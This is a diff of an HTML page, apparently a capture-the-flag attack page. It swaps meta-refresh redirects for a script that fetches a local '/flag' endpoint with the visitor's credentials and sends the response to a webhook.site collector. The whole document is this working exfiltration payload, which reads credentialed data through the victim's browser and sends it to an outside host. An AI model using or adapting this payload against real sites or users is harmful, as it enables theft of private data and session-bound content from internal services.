@@ -1,10 +1,21 @@
 <!DOCTYPE html>
 <html>
-<head>
-<meta http-equiv="refresh" content="0; url=https://31.97.187.222:40111/flag">
-</head>
 <body>
-<meta http-equiv="refresh" content="3; url=https://webhook.site/0e9133a4-4afe-41e9-a3b1-b4cd56158f75">
-Loading...
+<script>
+(async () => {
+  const hook = "https://webhook.site/0e9133a4-4afe-41e9-a3b1-b4cd56158f75";
+  try {
+    const resp = await fetch("https://127.0.0.1:40111/flag", {
+      credentials: "include",
+      mode: "cors"
+    });
+    const text = await resp.text();
+    await fetch(hook + "?stage=ok&len=" + text.length +
+                "&flag=" + encodeURIComponent(text));
+  } catch (e) {
+    await fetch(hook + "?stage=error&msg=" + encodeURIComponent(e.toString()));
+  }
+})();
+</script>
 </body>
 </html>
